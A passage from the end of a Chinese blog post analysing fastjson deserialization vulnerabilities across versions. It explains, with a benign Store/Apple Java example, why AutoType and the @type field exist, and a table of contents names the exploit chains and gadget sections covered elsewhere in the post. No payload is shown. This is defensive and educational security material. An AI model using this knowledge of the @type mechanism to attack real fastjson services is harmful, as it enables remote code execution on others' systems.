+<p>第二个链：<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html">P牛BCEL ClassLoader去哪里了</a></p>
+<p>大佬分析得很详细，有时间自己再总结下</p>
+<h1 id="AutoType深入理解"><a href="#AutoType深入理解" class="headerlink" title="AutoType深入理解"></a>AutoType深入理解</h1><p><strong>fastjson为什么要引入AutoType？</strong></p>
+<p>假设我们有下面这个Java类：</p>
+<pre><code>class Store &#123;
+
+    private String name;
+
+    private Fruit fruit;
+
+    public String getName() &#123;
+
+    return name;
+
+    &#125;
+
+    public void setName(String name) &#123;
+
+    this.name = name;
+
+    &#125;
+
+    public Fruit getFruit() &#123;
+
+    return fruit;
+
+    &#125;
+
+    public void setFruit(Fruit fruit) &#123;
+
+    this.fruit = fruit;
+
+    &#125;
+
+&#125;
+
+interface Fruit &#123;
+
+&#125;
+
+class Apple implements Fruit &#123;
+
+    private BigDecimal price;
+
+&#125;
+</code></pre>
+<p>当我们对它进行序列化时，Fastjson会扫描其中的Getter方法，即找到getName和getFruit，这时就会将Name和Fruit两个字段的值序列化到JSON字符串中。</p>
+<p>那么问题来了，<strong>上面定义的Fruit只是一个接口，序列化的时候Fastjson能将属性值正确序列化出来吗？</strong> 如果可以的话，反序列的时候，Fastjson会把这个Fruit反序列化成什么类型呢？</p>
+<pre><code>Store store = new Store();
+
+store.setName(&quot;Hollis&quot;);
+
+Apple apple = new Apple();
+
+apple.setPrice(new BigDecimal(0.5));
+
+store.setFruit(apple);
+
+String jsonString = JSON.toJSONString(store);
+
+System.out.println(&quot;toJSONString : &quot; + jsonString);
+</code></pre>
+<p>创建了一个store，为它指定了名称，并创建了Fruit的子类型Apple，然后将store用JSON.toJSONString进行序列化，可以得到以下JSON内容：</p>
+<pre><code>toJSONString : &#123;
+
+&quot;fruit&quot;:&#123;
+
+&quot;price&quot;:0.5
+
+&#125;
+
+,&quot;name&quot;:&quot;Hollis&quot;
+
+&#125;
+</code></pre>
+<p>Fruit的类型是什么呢，能否反序列化为Apple呢？</p>
+<pre><code>Store newStore = JSON.parseObject(jsonString, Store.class);
+
+System.out.println(&quot;parseObject : &quot; + newStore);
+
+Apple newApple = (Apple)newStore.getFruit();
+
+System.out.println(&quot;getFruit : &quot; + newApple);
+</code></pre>
+<p>执行结果如下：</p>
+<pre><code>toJSONString : &#123;
+
+&quot;fruit&quot;:&#123;
+
+&quot;price&quot;:0.5
+
+&#125;
+
+,&quot;name&quot;:&quot;Hollis&quot;
+
+&#125;
+
+parseObject : Store&#123;
+
+name=&#39;Hollis&#39;, fruit=&#123;&#125;&#125;
+
+Exception in thread &quot;main&quot; java.lang.ClassCastException: com.hollis.lab.fastjson.test.$Proxy0 cannot be cast to com.hollis.lab.fastjson.test.Apple
+
+at com.hollis.lab.fastjson.test.FastJsonTest.main(FastJsonTest.java:26)
+</code></pre>
+<p>在将store反序列化后，我们尝试将Fruit转换成Apple，但抛出了异常。因为fastjson在反序列化的时候也不知道这个接口要反序列成哪个实现类。</p>
+<blockquote>
+<p>使用Fastjson进行序列化，会将子类型抹去，只保留接口（抽象类）的类型，使得反序列化时无法拿到原始类型。</p>
+</blockquote>
+<p>如何解决这个问题呢？Fastjson引入了AutoType，在序列化时，把原始类型记录下来。使用方法是通过<code>SerializerFeature.WriteClassName</code>进行标记，即将上述代码中的：</p>
+<pre><code>String jsonString = JSON.toJSONString(store);
+</code></pre>
+<p>修改为：</p>
+<pre><code>String jsonString = JSON.toJSONString(store,SerializerFeature.WriteClassName);
+</code></pre>
+<p>修改后的代码输出结果如下：</p>
+<pre><code>System.out.println(&quot;toJSONString : &quot; + jsonString);
+
+&#123;
+
+&quot;@type&quot;:&quot;com.hollis.lab.fastjson.test.Store&quot;,
+
+&quot;fruit&quot;:&#123;
+
+&quot;@type&quot;:&quot;com.hollis.lab.fastjson.test.Apple&quot;,
+
+&quot;price&quot;:0.5
+
+&#125;
+
+,
+
+&quot;name&quot;:&quot;Hollis&quot;
+
+&#125;
+</code></pre>
+<p><strong>使用SerializerFeature.WriteClassName进行标记后，JSON字符串中多出了一个@type字段，标注了类对应的原始类型，方便在反序列化的时候定位到具体类型。</strong></p>
+<p>这时再将这个序列化的数据反序列化就能拿到实现类的数据类型了。</p>
+<p>这就是Fastjson中引入AutoType的原因，但是也正因为这个特性，才有后面的checkAutoType，以及一系列的黑名单绕过。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/java%E5%AE%89%E5%85%A8/" rel="tag"><i class="fas fa-tag"></i> java安全</a>
+          
+            <a href="/tags/fastjson/" rel="tag"><i class="fas fa-tag"></i> fastjson</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div>
+	  <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    1azysugar
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://1azy.icu/2023/05/03/fastjson/" title="fastjson全版本漏洞分析">http://1azy.icu/2023/05/03/fastjson/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议，转载请注明出处！
+  </li>
+</ul>
+
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2023/04/15/JNDI-Injection/" rel="next" title="JNDI注入原理分析">
+                <i class="fas fa-chevron-left"></i> JNDI注入原理分析
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2023/06/01/JMX/" rel="prev" title="JMX攻击">
+                JMX攻击 <i class="fas fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+	        <img class="site-author-image" itemprop="image"
+                  src="/images/avatar.jpg"
+                  alt="" />
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/lazysugar" target="_blank" title="GitHub">
+                      
+		      
+			<i class="fa-fw fab fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:1613664134@qq.com" target="_blank" title="E-Mail">
+                      
+		      
+			<i class="fa-fw fas fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+            <div class="cc-license motion-element" itemprop="license">
+              <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" target="_blank">
+                <img src="/images/cc-by-nc-sa.svg" alt="Creative Commons" />
+              </a>
+            </div>
+          
+
+          
+          
+
+          
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#fastjson%E5%88%86%E6%9E%90"><span class="nav-number">1.</span> <span class="nav-text">fastjson分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AE%80%E4%BB%8B"><span class="nav-number">1.1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="nav-number">1.2.</span> <span class="nav-text">使用方式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="nav-number">1.3.</span> <span class="nav-text">漏洞原理</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#fastjson-1-2-24"><span class="nav-number">2.</span> <span class="nav-text">fastjson-1.2.24</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#TemplatesImpl-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">2.1.</span> <span class="nav-text">TemplatesImpl 反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A4%BA%E4%BE%8B%EF%BC%9A"><span class="nav-number">2.1.1.</span> <span class="nav-text">示例：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#JdbcRowSetImpl-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">2.2.</span> <span class="nav-text">JdbcRowSetImpl 反序列化</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A4%BA%E4%BE%8B%EF%BC%9A-1"><span class="nav-number">2.2.1.</span> <span class="nav-text">示例：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#fastjson-1-2-25"><span class="nav-number">3.</span> <span class="nav-text">fastjson-1.2.25</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#fastjson-1-2-42"><span class="nav-number">4.</span> <span class="nav-text">fastjson-1.2.42</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#fastjson-1-2-43"><span class="nav-number">5.</span> <span class="nav-text">fastjson-1.2.43</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#fastjson-1-2-45"><span class="nav-number">6.</span> <span class="nav-text">fastjson-1.2.45</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#fastjson-1-2-47"><span class="nav-number">7.</span> <span class="nav-text">fastjson-1.2.47</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#fastjson-1-2-68"><span class="nav-number">8.</span> <span class="nav-text">fastjson-1.2.68</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%A4%BA%E4%BE%8B"><span class="nav-number">8.1.</span> <span class="nav-text">示例</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90"><span class="nav-number">8.1.1.</span> <span class="nav-text">原理分析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AF%BB%E6%89%BEGadget"><span class="nav-number">8.2.</span> <span class="nav-text">寻找Gadget</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99"><span class="nav-number">8.2.1.</span> <span class="nav-text">文件读写</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#FastJson%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0"><span class="nav-number">8.2.1.1.</span> <span class="nav-text">FastJson构造函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SafeFileOutputStream"><span class="nav-number">8.2.1.2.</span> <span class="nav-text">SafeFileOutputStream</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Output"><span class="nav-number">8.2.1.3.</span> <span class="nav-text">Output</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SerialOutput"><span class="nav-number">8.2.1.4.</span> <span class="nav-text">SerialOutput</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#fastjson%E5%AF%B9%E8%B1%A1%E5%BC%95%E7%94%A8"><span class="nav-number">8.2.1.5.</span> <span class="nav-text">fastjson对象引用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#commons-io%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99"><span class="nav-number">8.2.2.</span> <span class="nav-text">commons-io文件读写</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BE%9D%E8%B5%96"><span class="nav-number">8.2.2.1.</span> <span class="nav-text">依赖</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CharSequenceInputStream"><span class="nav-number">8.2.2.2.</span> <span class="nav-text">CharSequenceInputStream</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#FileWriterWithEncoding"><span class="nav-number">8.2.2.3.</span> <span class="nav-text">FileWriterWithEncoding</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#WriterOutputStream"><span class="nav-number">8.2.2.4.</span> <span class="nav-text">WriterOutputStream</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#TeeInputStream"><span class="nav-number">8.2.2.5.</span> <span class="nav-text">TeeInputStream</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#BOMInputStream"><span class="nav-number">8.2.3.</span> <span class="nav-text">BOMInputStream</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#GETTER-%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8"><span class="nav-number">8.2.3.1.</span> <span class="nav-text">GETTER 方法调用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#parse-%E4%B8%8E-parseObject"><span class="nav-number">8.2.3.2.</span> <span class="nav-text">parse 与 parseObject</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8C%87%E5%AE%9A-class-%E5%AF%B9%E8%B1%A1"><span class="nav-number">8.2.3.3.</span> <span class="nav-text">指定 class 对象</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%86%99%E5%87%BA"><span class="nav-number">8.2.3.4.</span> <span class="nav-text">文件写出</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%94%9F%E6%88%90%E4%BB%A3%E7%A0%81"><span class="nav-number">8.2.4.</span> <span class="nav-text">生成代码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%BC%E8%BF%B0"><span class="nav-number">8.2.5.</span> <span class="nav-text">综述</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#fastjson-1-2-80"><span class="nav-number">9.</span> <span class="nav-text">fastjson-1.2.80</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-2-68%E4%BF%AE%E5%A4%8D"><span class="nav-number">9.1.</span> <span class="nav-text">1.2.68修复</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8"><span class="nav-number">9.2.</span> <span class="nav-text">利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%89%88%E6%9C%AC%E6%8E%A2%E6%B5%8B"><span class="nav-number">9.2.1.</span> <span class="nav-text">版本探测</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%89%88%E6%9C%AC%E6%8E%A2%E6%B5%8B-2"><span class="nav-number">9.2.2.</span> <span class="nav-text">版本探测-2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8A%A5%E9%94%99%E6%8E%A2%E6%B5%8B%E4%BE%9D%E8%B5%96%E5%BA%93"><span class="nav-number">9.2.3.</span> <span class="nav-text">报错探测依赖库</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#dnslog%E6%8E%A2%E6%B5%8B%E4%BE%9D%E8%B5%96%E5%BA%93"><span class="nav-number">9.2.4.</span> <span class="nav-text">dnslog探测依赖库</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#grovvy"><span class="nav-number">9.2.5.</span> <span class="nav-text">grovvy</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%86%E6%9E%90"><span class="nav-number">9.2.5.1.</span> <span class="nav-text">分析</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#jython-spring-context-postgresql"><span class="nav-number">9.2.6.</span> <span class="nav-text">jython+spring-context+postgresql</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%86%E6%9E%90-1"><span class="nav-number">9.2.6.1.</span> <span class="nav-text">分析</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="nav-number">9.2.7.</span> <span class="nav-text">文件读取</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%86%E6%9E%90-2"><span class="nav-number">9.2.7.1.</span> <span class="nav-text">分析</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%8D%E5%87%BA%E7%BD%91"><span class="nav-number">10.</span> <span class="nav-text">不出网</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#AutoType%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3"><span class="nav-number">11.</span> <span class="nav-text">AutoType深入理解</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fas fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">1azysugar</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fas fa-chart-area"></i>
+    </span>
+    
+      <span class="post-meta-item-text">全站共计字数&#58;</span>
+    
+    <span title="全站共计字数"></span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fas fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    <div class="sidebar_wo">
+      <div id="leimu">
+        <img src="/images/b2t/leimuA.png" alt="雷姆" onmouseover="this.src='/images/b2t/leimuB.png'" onmouseout="this.src='/images/b2t/leimuA.png'" title="回到顶部">
+      </div>
+      <div class="sidebar_wo" id="lamu">
+        <img src="/images/b2t/lamuA.png" alt="雷姆" onmouseover="this.src='/images/b2t/lamuB.png'" onmouseout="this.src='/images/b2t/lamuA.png'" title="回到底部">
+      </div>
+    </div>
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fas fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="far fa-frown fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
